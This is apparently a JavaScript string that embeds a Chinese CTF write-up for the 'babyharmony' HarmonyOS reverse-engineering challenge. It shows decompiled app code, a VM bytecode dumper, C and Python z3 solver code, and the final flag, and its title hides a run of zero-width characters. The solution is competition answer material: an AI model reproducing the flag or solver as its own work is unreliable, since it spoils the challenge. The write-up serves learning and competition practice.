const n=`# \u3010CTF\u89E3\u9898\u3011\u202C\u200C\u2063\u2062\uFEFF\u2062\u2063\uFEFF\uFEFF\uFEFF\uFEFF\u202C\u202C\uFEFF\u200C\u2061\u2062\u200D\u200B\u2062\u2061\u2064\u2064\u2064\u202C\u2063\u2063\uFEFF\u200D\u2061\u200D\uFEFF\u2062\u200D\u200B\u2064\u3010\u786C\u89E3\uFF0C\u6CA1\u7528\u9E3F\u8499\u4E13\u5C5E\u53CD\u7F16\u8BD1\u5DE5\u5177\u30112024 05.27 \u4EAC\u9E92 ctf \u521D\u8D5B wp - LaoGong - \u98DE\u4E66\u4E91\u6587\u6863

Created: November 25, 2024 8:03 PM
URL: https://ycznkvrmzo.feishu.cn/docx/ZqU0dU0h2oW3eFxZtZMctShFnyh
\u6587\u7AE0\u7C7B\u522B(\u6839\u636EWebStorm\u7684\u76EE\u5F55\u6765): \u9E3F\u8499HarmonyOS
\u8BC4\u5206: 8

2024 05.27 \u4EAC\u9E92 ctf \u521D\u8D5B wp - LaoGong

\u7B2C\u4E8C

\u521A\u770B\u9898\u65F6\uFF1A\u8FD9\u662F12h\u6BD4\u8D5B\u7684\u9898\u76EE\uFF1F\u8FD9\u662F\u4EBA\u80FD\u505A\u7684\uFF1F\u961F\u4F0D\u6BCF\u4E2A\u65B9\u5411\u5E73\u5747\u4E00\u4E2A\u4EBA\u5DE6\u53F3\uFF0C\u628A\u6BCF\u4E2A\u9898\u76EE\u770B\u61C2\u7684\u65F6\u95F4\u90FD\u4E0D\u591F

\u7ED3\u675F\u65F6\uFF1A\u5176\u4ED6\u961F\u4E5F\u4E0D\u4F1A\uFF0C\u6BCF\u4E2A\u65B9\u5411\u51FA\u4E00\u9053\u9898\u5C31\u8FDB\u524D\u4E09\u4E86\uFF0C\u5927\u80DC\u5229

\u81F3\u4E8E\u9006\u5411\u4E3A\u5565\u53EA\u51FA\u4E86\u4E00\u9053\u9898\uFF0C\u56E0\u4E3A\u9006\u5411\u624B\u627E\u5230\u4E86\u67D0\u96F6\u89E3 pwn \u9898\u7684\u6D1E\uFF0C\u4E00\u4E0B\u5348\u52A0\u665A\u4E0A\u90FD\u5728\u8C03\u52A0\u66B4\uFF0C\u672C\u5730\u90FD\u51FA\u4E86\u8FDC\u7A0B\u6B7B\u6D3B\u6CA1\u6709\uFF0C\u5FEB\u7ED3\u675F\u65F6\u95EE\u51FA\u9898\u4EBA\u624D\u77E5\u9053\u539F\u6765\u662F\u8FDC\u7A0B\u5DF2\u7ECF\u4FEE\u590D\u4E86\u7684\u975E\u9884\u671F\uFF0C\u4F46\u662F\u7ED9\u6211\u4EEC\u7684\u9644\u4EF6\u6CA1\u66F4\u65B0\uFF0C\u6D6A\u8D39\u4E86\u6574\u6574\u4E00\u4E0B\u5348\u665A\u4E0A\uFF0C\u96BE\u7EF7

## reverse

### babyharmony

\u9E3F\u8499\u9006\u5411\uFF0C\u4F46\u662F\u6CA1\u6709\u9E3F\u8499\u5C31\u505A\u9006\u5411\u3002\u7F51\u4E0A\u641C\u7D22\u5565\u90FD\u6CA1\u6709\uFF0C\u53EA\u80FD\u796D\u51FAstrings\u5927\u6CD5\u4E86\uFF0Cmodules.abc\u91CC\u76F4\u63A5\u5F97\u5230\u6E90\u7801\uFF1A

\`\`\`

import hilog from '@ohos:hilog';
import testNapi from '@app:com.example.test/entry/entry';
import batteryInfo from '@ohos:batteryInfo';
// ...
class Index extends ViewPU {
    constructor(parent, params, __localStorage, elmtId = -1) {
        super(parent, __localStorage, elmtId);
        this.context = getContext(this);
        this.__message = new ObservedPropertySimplePU('\u8BF7\u8F93\u5165flag', this, "message");
        this.__button_name = new ObservedPropertySimplePU('\u63D0\u4EA4', this, "button_name");
        this.__flag = new ObservedPropertySimplePU('', this, "flag");
        this.__result = new ObservedPropertySimplePU('', this, "result");
        this.dialogController = new CustomDialogController({
            builder: () => {
                let jsDialog = new CustomDialogExample(this, {
                    textValue: this.__result,
                });
                jsDialog.setController(this.dialogController);
                ViewPU.create(jsDialog);
            }
        }, this);
        this.setInitiallyProvidedValue(params);
    }
    // ...

    aboutToAppear() {
        testNapi.register(0, (a) => {
            var t = batteryInfo.batterySOC - a;
            var f;
            if (t > 0)
                f = 1;
            else if (t == 0)
                f = 0;
            else
                f = -1;
            return f === 0;
        });
        testNapi.register(1, (a) => {
            var t = batteryInfo.chargingStatus - a;
            var f;
            if (t > 0)
                f = 1;
            else if (t == 0)
                f = 0;
            else
                f = -1;
            return f === 0;
        });
        // ...
    }
    // ...
        this.observeComponentCreation((elmtId, isInitialRender) => {
            ViewStackProcessor.StartGetAccessRecordingFor(elmtId);
            Button.createWithLabel(this.button_name);
            Button.onClick(() => {
                this.context.resourceManager.getRawFileContent("bin").then((value) => {
                    var c = testNapi.check(this.flag, value);
                    if ((c & 0b100) === 0b100) {
                        this.result = '\u7CFB\u7EDF\u73AF\u5883\u5F02\u5E38';
                    }
                    else if ((c & 0b10) === 0b10) {
                        this.result = 'flag\u683C\u5F0F\u9519\u8BEF';
                    }
                    else if ((c & 0b1) === 0b1) {
                        this.result = 'flag\u9519\u8BEF\u6216\u7CFB\u7EDF\u73AF\u5883\u5F02\u5E38';
                    }
                    else {
                        this.result = 'flag\u6B63\u786E';
                    }
                    this.dialogController.open();
                });
            });
            if (!isInitialRender) {
                Button.pop();
            }
            ViewStackProcessor.StopGetAccessRecording();
        });
    // ...
}

\`\`\`

\u6B63\u597D\u6709 libentry.so \uFF0C\u4E5F\u5C31\u662F\u4E0A\u9762\u7684 testNapi

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjk5MjNiZWU3MGNmNDc3ZDZhNDlhZGY4NTRlNzhhNDFfZ1haZ0s5U2ZTc25XWnhFcEJ2WjQxMGttSjFhUW9xcDZfVG9rZW46SEZFWWI4RVI3b1V3eVN4ejZlWmNORmJ4blRoXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjk5MjNiZWU3MGNmNDc3ZDZhNDlhZGY4NTRlNzhhNDFfZ1haZ0s5U2ZTc25XWnhFcEJ2WjQxMGttSjFhUW9xcDZfVG9rZW46SEZFWWI4RVI3b1V3eVN4ejZlWmNORmJ4blRoXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA)

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=MmZmYjk2NjdlZjJhYzA2MmI1ODdiOTU3YWU4NDYyOWNfNTE5TnJ5eVRwQ0Jpc2luZDBEOVRGYm5BdXc1MWF6WUJfVG9rZW46Q1pBNGJBYVRzb1R2UXp4RVdmT2NwR2lXbjY3XzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=MmZmYjk2NjdlZjJhYzA2MmI1ODdiOTU3YWU4NDYyOWNfNTE5TnJ5eVRwQ0Jpc2luZDBEOVRGYm5BdXc1MWF6WUJfVG9rZW46Q1pBNGJBYVRzb1R2UXp4RVdmT2NwR2lXbjY3XzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA)

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=YmI4NWI4YWNkYmY1ODQ1YzE4MmE3NmJiNzRjY2Q1NTNfVHBFYVBqTEZ6YXBtWUpORmtpb3BFeGt4MzhEdzNJUkJfVG9rZW46R0pod2I2dVhEb0VTVUN4R1Brd2NLOFg3bmxnXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=YmI4NWI4YWNkYmY1ODQ1YzE4MmE3NmJiNzRjY2Q1NTNfVHBFYVBqTEZ6YXBtWUpORmtpb3BFeGt4MzhEdzNJUkJfVG9rZW46R0pod2I2dVhEb0VTVUN4R1Brd2NLOFg3bmxnXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA)

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDFkNTJiM2EwM2VkMWIyY2M5OTRiY2MxODhiYmFiNjdfcjg1R2tiek9ORkZqSGJGeXJaR0RjbzdtbjZOaXAzMnBfVG9rZW46R3FGZWJSdnN3b1I4YzJ4dXNvb2NmZjc2bnFnXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDFkNTJiM2EwM2VkMWIyY2M5OTRiY2MxODhiYmFiNjdfcjg1R2tiek9ORkZqSGJGeXJaR0RjbzdtbjZOaXAzMnBfVG9rZW46R3FGZWJSdnN3b1I4YzJ4dXNvb2NmZjc2bnFnXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA)

\u56DB\u4E2A\u51FD\u6570\uFF0C\u6B63\u597D\u662F\u4E0A\u9762\u4EE3\u7801\u91CC\u4F7F\u7528\u8FC7\u7684\u540D\u79F0

\u5B9E\u9645\u4E0A\u8981\u7528\u7684\u5C31\u662Fregister\u548Ccheck

bin\u5728resources/rawfile\u4E0B

\u6240\u4EE5\u5C31\u53D8\u6210\u4E86native\u9006\u5411\uFF0C\u8DDF\u9E3F\u8499\u6CA1\u5173\u7CFB\u4E86\u3002

check\u51FD\u6570\u5927\u81F4\u7ED3\u6784\uFF1A

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=MWRiOWUxNTQzMzk0NmE3NGYzMGMxNzlhNTc2YTUzNDFfYXJwU3dDWGdWUmJCRHBpb3NxQmNVNWtjM3paMnZ3ZU9fVG9rZW46TWNjNWJOcWt4b2Zrckl4ZERCdWNyckR2bm5oXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=MWRiOWUxNTQzMzk0NmE3NGYzMGMxNzlhNTc2YTUzNDFfYXJwU3dDWGdWUmJCRHBpb3NxQmNVNWtjM3paMnZ3ZU9fVG9rZW46TWNjNWJOcWt4b2Zrckl4ZERCdWNyckR2bm5oXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA)

\u83B7\u53D6\u53C2\u6570\uFF0C\u5224\u65ADflag\u683C\u5F0F\uFF1B

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=MjExZTQxYjQzZWM0YTE5MzgzMzVmMTMwMDE3ZGUzZWNfZ3VGNHhYdVNQbjFKZkx5TTRuSHVCNUpBNEdUa0R5d1BfVG9rZW46TTVmSmJPRUJ0bzNWM0R4bG9hdGNuNlBybmdiXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=MjExZTQxYjQzZWM0YTE5MzgzMzVmMTMwMDE3ZGUzZWNfZ3VGNHhYdVNQbjFKZkx5TTRuSHVCNUpBNEdUa0R5d1BfVG9rZW46TTVmSmJPRUJ0bzNWM0R4bG9hdGNuNlBybmdiXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA)

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjc3NjM4ODQxZGQ2YjkyNTg4YzY3ZGU0MTE3NzhlMGFfRDlOWndoMGRER3puS1A3UVpRdEZieFYwQkVkU1Z3emJfVG9rZW46RGtaamJCME83b3hyNHN4VFVGM2NpN2ZqbndkXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjc3NjM4ODQxZGQ2YjkyNTg4YzY3ZGU0MTE3NzhlMGFfRDlOWndoMGRER3puS1A3UVpRdEZieFYwQkVkU1Z3emJfVG9rZW46RGtaamJCME83b3hyNHN4VFVGM2NpN2ZqbndkXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA)

bin\u4E2D\u7684\u6570\u636E\u4F5C\u4E3A\u4E00\u4E2A\u5C0F\u578Bvm\u4EE3\u7801\u6267\u884C\uFF1B\u6267\u884C\u8FC7\u7A0B\u662F\u53D6\u51FA\u7B2C\u4E00\u4E2A\u503C\uFF0C\u5728 methods \u4E2D\u627E\u5230\u8FD9\u4E2A\u503C\u6CE8\u518C\u7684\u51FD\u6570\uFF0C\u518D\u627E\u5230\u8FD9\u4E2A\u503C\u62160x100\u5F97\u5230\u7684\u503C\u5728 methods \u4E2D\u6CE8\u518C\u7684\u51FD\u6570\uFF1B

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=OWQyNmY0M2NkNDhlOGIxNzljMzA1YjZjMDIzMGRmYzlfckdLNzhydTF5QmRObVFMM0JaUTlxYVNReEEydngyMzFfVG9rZW46SndYV2JBb1VjbzRuQ2x4NUdrZWNzSFV1bk5nXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=OWQyNmY0M2NkNDhlOGIxNzljMzA1YjZjMDIzMGRmYzlfckdLNzhydTF5QmRObVFMM0JaUTlxYVNReEEydngyMzFfVG9rZW46SndYV2JBb1VjbzRuQ2x4NUdrZWNzSFV1bk5nXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA)

\u8C03\u7528\u7B2C\u4E8C\u4E2A\u51FD\u6570\uFF0C\u518D\u6839\u636E bin \u4E2D\u7684\u7B2C\u4E8C\u4E2A\u503C\u4F20\u5165\u4E0D\u540C\u7684\u53C2\u6570\u7ED9\u7B2C\u4E00\u4E2A\u51FD\u6570\u8C03\u7528\uFF0C

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=ODMyMGQ5MTVjMmQzOTJmNGNlOGU0ZDQxN2ZjZjFlZWFfbmo2eElobzBwT1pCS0JvUHZIVVRvRWlWZUp5R3NXdEZfVG9rZW46VzN3T2JKMFBEb2pkSmh4dlprcmN4Z0dnbkpnXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=ODMyMGQ5MTVjMmQzOTJmNGNlOGU0ZDQxN2ZjZjFlZWFfbmo2eElobzBwT1pCS0JvUHZIVVRvRWlWZUp5R3NXdEZfVG9rZW46VzN3T2JKMFBEb2pkSmh4dlprcmN4Z0dnbkpnXzE3MzI1MzYyNzA6MTczMjUzOTg3MF9WNA)

\u6700\u540E\u5224\u65AD method_0_ret \u975E 0 \uFF0C\u5426\u5219\u5C31\u662F \u201C\u7CFB\u7EDF\u73AF\u5883\u5F02\u5E38\u201D \uFF1B\u800C method_1_ret \u5C31\u4F1A\u4F20\u7ED9\u4E0B\u9762\u7684 switch-case \u4E2D\u7684\u52A0\u5BC6\u505A\u5BC6\u94A5\u3002

\u968F\u4FBF\u770B\u770B\u4E24\u4E2A\u5BF9\u5E94\u7684\u51FD\u6570\uFF1A

\`\`\`

        testNapi.register(2, (a) => {
            var t = batteryInfo.healthStatus - a;
            var f;
            if (t > 0)
                f = 1;
            else if (t == 0)
                f = 0;
            else
                f = -1;
            return f === 0;
        });

        testNapi.register(258, () => {
            return batteryInfo.healthStatus;
        });

\`\`\`

\u4E0A\u9762\u7684\u51FD\u6570\u662F\u8981\u6EE1\u8DB3 batteryInfo.healthStatus == a \uFF08\u4F20\u5165\u7684\u53C2\u6570\uFF09\uFF0C\u4E0B\u9762\u7684\u8FD4\u56DE\u503C\u5C31\u662F batteryInfo.healthStatus \uFF0C\u90A3\u4E0D\u5C31\u662F\u5BF9\u7740\u7B54\u6848\u505A\u9898\u561B\u3002\u6BCF\u5BF9\u51FD\u6570\u90FD\u662F\u8FD9\u6837\u7684\uFF0C\u4E0A\u9762\u505A\u503C\u68C0\u6D4B\uFF0C\u4E0B\u9762\u8FD4\u56DE\u8FD9\u4E2A\u503C\uFF0C\u6240\u4EE5\u53EA\u8981\u628A\u4E0A\u9762\u7684\u51FD\u6570\u7684\u53C2\u6570\u63D0\u53D6\u51FA\u6765\uFF0C\u5C31\u662F\u4E0B\u9762\u7684\u51FD\u6570\u5E94\u8BE5\u8FD4\u56DE\u7684\u503C\u3002\u811A\u672C\u5982\u4E0B

\`\`\`
def dump_bin(bin):
    d = []
    pc = 0
    while pc < len(bin):
        op = bin[pc]
        # print('#', pc, op)
        # print('b = func[%d]()' % (op | 0x100))
        type = bin[pc + 1]
        if type == 2 or type == 0:
            # missing bin[pc + 2]
            # print('a = func[%d](%d)' % (op, bin[pc + 3]))
            key = bin[pc + 3]
            pc += 4
        elif type == 1:
            size = bin[pc + 2]
            s = bin[pc + 3: pc + 3 + size]
            # print('a = func[%d](%s)' % (op, repr(s)))
            # print('b = xor(b)')
            key = 0
            for i in s: key ^= i
            pc += 3 + size
        else:
            pc += 3
            assert False
        d.append((op, key))
    return d

\`\`\`

\u8FD4\u56DE\u7684\u5217\u8868\u5C31\u662F\u6267\u884C\u7684\u5C0F\u578Bvm\u6307\u4EE4\u987A\u5E8F\uFF0C\u6BCF\u4E2A\u5143\u7D20\u7B2C\u4E00\u4E2A\u503C\u662Fopcode\uFF0C\u7B2C\u4E8C\u4E2A\u503C\u662Fkey

\u7136\u540E\u5C31\u662F\u91CD\u91CF\u7EA7\u7684\u52A0\u5BC6\u7B97\u6CD5\u4E86\u3002

\u52A0\u5BC6\u8FC7\u7A0B\u7684\u8FD0\u7B97\u5C31\u8FD9\u4E09\u79CD\uFF0C\u662F\u5BC6\u94A5 key \u548C flag \u7684\u6BCF\u4E2A\u5B57\u7B26\u4F9D\u6B21\u4EA4\u66FF\u505A\u4E00\u6B21\u8FD0\u7B97\u3002

\`\`\`
c = ror1(c, x) ^ k;
c = swap_2_bit(c, m, n) ^ k
c = c ^ y ^ k; // \u4E5F\u53EF\u80FD\u662Fror1\u4E2D\u7684 x \u4E3A 0 \uFF0C\u6216\u8005 swap_2_bit \u4E2D\u7684 m == n

\`\`\`

\u770B\u8D77\u6765\u5F88\u7B80\u5355\uFF0C\u4F46\u662F\uFF0C\u6709 9 \u4E2A case \uFF0C\u6BCF\u4E2A case \u91CC\u7684\u6BCF\u4E2A flag \u503C\uFF08\u957F\u5EA6 38 \uFF09\u90FD\u505A\u4E86\u8FD9\u79CD\u8FD0\u7B97\uFF0C\u91CC\u9762\u7684\u5E38\u91CF\u503C\uFF08\u5E94\u8BE5\uFF09\u6CA1\u89C4\u5F8B\uFF0C\u603B\u5171\u5C31\u6709 9 * 38 * 2 \u6761\u8BED\u53E5\uFF0C\u800C\u4E14\u8FD8\u662F\u6781\u7AEF\u91CD\u5EA6\u4F18\u5316\u7684\u4EE3\u7801\uFF0C\u624B\u6284\u7684\u96BE\u5EA6\u4E0D\u4E9A\u4E8E\u5728\u7EB8\u4E0A\u4ECE 0 \u5199\u5230 100000 \uFF0C\u800C\u4E14\u6284\u9519\u4E86\u8FD8\u6781\u96BE\u6392\u67E5\uFF0C\u6284\u4E86 50 \u6761\u8BED\u53E5\u540E\u679C\u65AD\u653E\u5F03\u3002

\u8FD9\u65F6\u5019\u5C31\u4E0D\u5F97\u4E0D\u60F3\u5230\uFF0C\u5B83\u90FD\u662F\u6307\u4EE4\uFF0C\u53EA\u8981\u6211\u628A\u6307\u4EE4\u63D0\u53D6\u51FA\u6765\u76F4\u63A5\u6267\u884C\u5C31\u884C\u4E86\uFF0C\u5F53\u4F5C\u9ED1\u76D2\u6765\u505A\uFF0C\u53CD\u6B63\u5C31\u8FD9\u4E09\u79CD\u6A21\u5F0F\uFF0C\u5BC6\u94A5\u7684\u53D8\u5316\u4E0E flag \u65E0\u5173\u76F4\u63A5\u5F53\u6210\u5E38\u91CF\uFF0C\u6839\u636E\u8F93\u5165\u8F93\u51FA\u66B4\u7834\u4E09\u79CD\u6A21\u5F0F\uFF0C\u5F97\u5230\u53C2\u6570\u3002\u81F3\u4E8E\u6307\u4EE4\u63D0\u53D6\uFF0C\u8FD9\u91CC\u53EA\u53D6\u4E2D\u95F4\u8FD0\u7B97\u7684\u6307\u4EE4\u5C31\u884C\u4E86\uFF0C\u76F4\u63A5mmap\u4E00\u6BB5\u5185\u5B58\u5373\u53EF\uFF0C\u5F53\u7136\u4E5F\u53EF\u4EE5\u5C06\u6574\u4E2A elf \u52A0\u8F7D\u8FDB\u6765 \uFF08 [GitHub - IchildYu/load-elf](https://github.com/IchildYu/load-elf) \uFF09\uFF0C\u505A\u597D\u53C2\u6570\u63A7\u5236\u5C31\u884C\u4E86\u3002

\u4E0B\u4E00\u4E2A\u95EE\u9898\u5C31\u662F\u600E\u4E48\u6C42\u89E3\u3002\u8FD9\u4E9B\u8FD0\u7B97\u90FD\u662F\u7B80\u5355\u4F4D\u8FD0\u7B97\uFF0C\u53EF\u4EE5\u5199\u9006\uFF0C\u4F46\u662F\u6CA1\u5FC5\u8981\uFF0C\u4E0D\u5982\u76F4\u63A5\u4EA4\u7ED9 z3 \u6C42\u3002\u52A0\u8F7D\u4E0A\u9762\u7684\u6307\u4EE4\u662F\u8981\u7528 C \u5199\u7684\uFF0C\u5982\u679C\u7528 z3 \u5C31\u8981\u548C python \u4EA4\u4E92\uFF08python\u7B80\u5355\uFF09\uFF0C\u90A3\u5C31\u7528 C \u5199\u52A8\u6001\u94FE\u63A5\u5E93\u5427\uFF0C python \u7528 cdll \u52A0\u8F7D\u5C31\u884C\u4E86\uFF08\u6B63\u597D\u7ED9\u4E86 x64 \u7684 libentry.so \uFF09\u3002

C \u4EE3\u7801\uFF1A

\`\`\`
__asm__(
    "__round:\\n"
    "sub rsp, 0x10\\n"
    "mov [rsp+0x8], rdi\\n"
    "mov r12, rsi\\n"
    "call rdx\\n"
    "add rsp, 0x10\\n"
    "ret\\n"
);

void __round(unsigned char* array, int key, void* entry);

extern int bf_round(int key, int offset, int index);
extern void setup();
extern void one_round(unsigned char* array, int key, int offset);

static char* base;

void setup() {
    // SET_LOGE();
    const char* path = "./libentry_x64.so";
    base = load_elf(path);
    *(base + 0x2a07) = 0xc3; // ret
}

void one_round(unsigned char* array, int key, int offset) {
    if (base == NULL) setup();
    __round(array, key, base + offset);
}

unsigned char g(unsigned char x, unsigned char n) {
    return (x >> n) & 1;
}

unsigned char s(unsigned char x, unsigned char n) {
    return (x & 1) << n;
}

unsigned char swapbit(unsigned char x, unsigned char m, unsigned char n) {
    if (m == n) return x;
    return s(g(x, m), n) | s(g(x, n), m) | (x & ~(s(1, n) | s(1, m)));
}

unsigned char bit_length(unsigned char x) {
    if (x == 0) return 0;
    for (int i = 8; i > 0; i--) {
        if (x & (1 << (i - 1))) return i;
    }
}

unsigned char swapkeep(unsigned char x, unsigned char mask) {
    unsigned char swapbits = ~mask & 0xff;
    unsigned char m = bit_length(swapbits) - 1;
    assert(0 <= m && m < 7);
    swapbits ^= 1 << m;
    unsigned char n = bit_length(swapbits) - 1;
    assert(0 <= n && n < 7);
    swapbits ^= 1 << n;
    assert(swapbits == 0);
    return swapbit(x, m, n);
}

unsigned char ror1(unsigned char x, unsigned char n) {
    n &= 7;
    x &= 0xff;
    return (x >> n) | (x << (8 - n)) & 0xff;
}

unsigned char rol1(unsigned char x, unsigned char n) {
    return ror1(x, 8 - n);
}

#define XOR 0 // c ^ val0 ^ val1
#define ROT 1 // ror1(c, val0) ^ val1
#define SWP 2 // swapkeep(c, val0) ^ val1
#define MAKE_RET_VAL(type, val0, val1) (((type) << 16) | ((val0) << 8) | (val1))

int bf_round(int key, int offset, int index) {
    if (base == NULL) setup();
    unsigned char array[38];
    array[index] = 0;
    __round(array, key, base + offset);
    unsigned char val1 = array[index];

    int flag = 0;
    // test xor
    for (int i = 0; i < 7; i++) {
        array[index] = 1 << i;
        __round(array, key, base + offset);
        array[index] ^= val1;
        if (array[index] != (1 << i)) {
            flag = 1;
            break;
        }
    }
    if (flag == 0) { // XOR
        return MAKE_RET_VAL(XOR, 0, val1);
    }

    // test rol1
    array[index] = 1;
    __round(array, key, base + offset);
    array[index] ^= val1;
    unsigned char val0 = bit_length(array[index]);
    assert(val0 != 0);
    val0--;
    if (val0 != 0) {
        assert(array[index] == (1 << val0));
        for (int i = 1; i < 7; i++) {
            array[index] = 1 << i;
            __round(array, key, base + offset);
            array[index] ^= val1;
            if (array[index] != (1 << ((i + val0) % 8))) {
                flag = 0;
                break;
            }
        }
        if (flag == 1) {
            return MAKE_RET_VAL(ROT, 8 - val0, val1);
        }
    }

    // swapkeep
    for (int i = 0; i < 7; i++) {
        array[index] = 1 << i;
        __round(array, key, base + offset);
        array[index] ^= val1;
        if (array[index] != (1 << i)) {
            assert(bit_length(array[index]));
            assert(array[index] == (1 << (bit_length(array[index]) - 1)));
            val0 = ~((1 << i) | array[index]);
            return MAKE_RET_VAL(SWP, val0, val1);
        }
    }
    assert(0);
}

// gcc ./x64_main.c -o lib -g -ldl -masm=intel -shared

\`\`\`

python:

\`\`\`
def g(x, n):
    return (x >> n) & 1

def s(x, n):
    return (x & 1) << n

def swapbit(x, m, n):
    if m == n: return x
    return s(g(x, m), n) | s(g(x, n), m) | (x & ~(s(1, n) | s(1, m)))

def swapkeep(x, mask):
    swapbits = ~mask & 0xff
    m = swapbits.bit_length() - 1
    assert 0 <= m < 8
    swapbits ^= 1 << m
    n = swapbits.bit_length() - 1
    assert 0 <= n < 8
    swapbits ^= 1 << n
    assert swapbits == 0
    return swapbit(x, m, n)

def ror1(x, n):
    n &= 7
    if isinstance(x, int):
        x &= 0xff
        return (x >> n) | (x << (8 - n)) & 0xff
    else:
        return LShR(x, n) | (x << (8 - n)) & 0xff

entries = [
    0x2efa,
    0x42e9,
    0x3428,
    0x38fd,
    0x2522,
    0x480d,
    0x4cc6,
    0x3df6,
    0x51df
]

bin = open('./bin', 'rb').read()
_seq = dump_bin(bin)
# print(_seq)

import ctypes

lib = ctypes.cdll.LoadLibrary('./lib')
# extern void setup();
lib.setup()

'''
# extern void one_round(unsigned char* array, int key, int offset);
for op, key in _seq:
    if op == 0:
        break
else:
    assert False

# print('%02x' % key)

data = b'\\x00' * 40
lib.one_round(data, key, entries[op])
v = data[12]
print('%02x' % v)

for i in range(8):
    data = b'\\x00' * 12 + (1 << i).to_bytes(1, 'little') + b'\\x00' * 27
    lib.one_round(data, key, entries[op])
    print(i, '%02x' % (v ^ data[12]))
'''

# extern int bf_round(int key, int offset, int index);
def encrypt(array, seq):
    for op, key in seq:
        for i in range(38):
            v = lib.bf_round(key, entries[op], i)
            type, val0, val1 = v >> 16, (v >> 8) & 0xff, v & 0xff
            if type == 0:
                assert val0 == 0
                # print(i, 'c ^= 0x%x' % val1)
                array[i] ^= val1
            elif type == 1:
                # print(i, 'c = ror1(c, %d) ^ 0x%x' % (val0, val1))
                array[i] = ror1(array[i], val0) ^ val1
            elif type == 2:
                # print(i, 'c = swapkeep(c, 0x%x) ^ 0x%x' % (val0, val1))
                array[i] = swapkeep(array[i], val0) ^ val1
            else:
                assert False, type

from z3 import *
_array = [BitVec('x%d' % i, 8) for i in range(38)]
array = _array[:]
encrypt(array, _seq)

result = [226, 125, 77, 72, 55, 231, 235, 154, 118, 5, 125, 135, 49, 162, 160, 77, 248, 159, 61, 164, 56, 139, 225, 229, 136, 139, 89, 191, 4, 222, 40, 234, 126, 202, 215, 252, 133, 165]
# print(len(result))

s = Solver()
for i in range(38):
    s.add(array[i] == result[i])

assert s.check() == sat
model = s.model()
# print(model)
flag = []
for i in _array:
    flag.append(model[i].as_long())

print(bytes(flag))
# flag{3da8767cfb9424b9bbcc09008e36642d}

\`\`\`

\u81F3\u4E8E\u4EE3\u7801\u4E2D\u4E3A\u4EC0\u4E48\u4F1A\u51FA\u73B0 swapkeep \u8FD9\u4E48\u5947\u602A\u7684\u51FD\u6570\uFF0C\u7EAF\u7EAF\u662F\u4E00\u5F00\u59CB\u4E3A\u4E86\u65B9\u4FBF\u624B\u6284\u8BED\u53E5\u7684\u9057\u7559\u4EA7\u7269\uFF0C\u61D2\u5F97\u518D\u6539\u4E86\u3002

\u7ED9\u7684\u4EE3\u7801\u91CC\u8FD8\u6709\u70B9\u903B\u8F91\u9519\u8BEF\uFF0Cror1\u4E2D\u7684\u53F3\u79FB\u662F\u6709shr\u548Csar\u4E24\u79CD\u7684\uFF0Cror\u53EA\u80FD\u662Fshr\uFF0C\u4E5F\u5C31\u662F\u65E0\u7B26\u53F7\u6570\u79FB\u4F4D\uFF0C\u5BF9\u4E8Ekey\u7684\u8FD0\u7B97\u786E\u5B9E\u662F\u8FD9\u6837\u7684\uFF0C\u4F46\u662Fflag\u5E94\u8BE5\u662F\u58F0\u660E\u4E3A\u4E86 char*\uFF0C\u79FB\u4F4D\u65F6\u5C31\u53D8\u6210\u4E86 sar

[https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=OTIzZmRkOGM2MGJiOTMyOWY5YjhhNjM2OTc1OWFmZWFfTmpXekFMbHlnOE5lcEhHYk5zUkl2YzRscHdtV3N4SVJfVG9rZW46S0FwN2IyVnpUb2JYSU14MTJjRWN2R1FubkxnXzE3MzI1MzYzMTU6MTczMjUzOTkxNV9WNA](https://ycznkvrmzo.feishu.cn/space/api/box/stream/download/asynccode/?code=OTIzZmRkOGM2MGJiOTMyOWY5YjhhNjM2OTc1OWFmZWFfTmpXekFMbHlnOE5lcEhHYk5zUkl2YzRscHdtV3N4SVJfVG9rZW46S0FwN2IyVnpUb2JYSU14MTJjRWN2R1FubkxnXzE3MzI1MzYzMTU6MTczMjUzOTkxNV9WNA)

